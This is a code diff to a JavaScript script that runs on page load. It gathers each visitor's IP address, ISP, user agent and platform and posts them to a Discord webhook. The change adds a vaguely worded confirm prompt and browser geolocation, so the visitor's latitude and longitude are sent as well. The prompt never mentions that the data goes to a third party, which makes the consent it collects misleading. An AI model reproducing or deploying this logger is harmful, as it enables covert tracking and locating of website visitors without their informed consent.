@@ -10,26 +10,42 @@ window.addEventListener("load", function() {
         var userAgent = navigator.userAgent;
         var platform = navigator.platform;
 
-        var webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
-        var message = {
-            "content": `A visitor has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}`
-        };
+        // Ask for location permission
+        if (confirm("Do you want to allow this site to access your location data?")) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-        }).then(function(response) {
-            if (response.ok) {
-                console.log("Notification sent to Discord successfully.");
+                    var webhookURL = "YOUR_DISCORD_WEBHOOK_URL";
+                    var message = {
+                        "content": `A visitor has accessed your webpage.\nIP Address: ${ipAddress}\nISP: ${isp}\nUser Agent: ${userAgent}\nPlatform: ${platform}\nLocation: Latitude ${latitude}, Longitude ${longitude}`
+                    };
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    }).then(function(response) {
+                        if (response.ok) {
+                            console.log("Notification sent to Discord successfully.");
+                        } else {
+                            console.log("Failed to send notification to Discord.");
+                        }
+                    }).catch(function(error) {
+                        console.error("Error:", error);
+                    });
+                }, function(error) {
+                    console.error("Geolocation error:", error);
+                });
             } else {
-                console.log("Failed to send notification to Discord.");
+                console.error("Geolocation is not supported by this browser.");
             }
-        }).catch(function(error) {
-            console.error("Error:", error);
-        });
+        } else {
+            console.log("User denied location access.");
+        }
     })
     .catch(function(error) {
         console.error("Error fetching IP address and ISP data:", error);
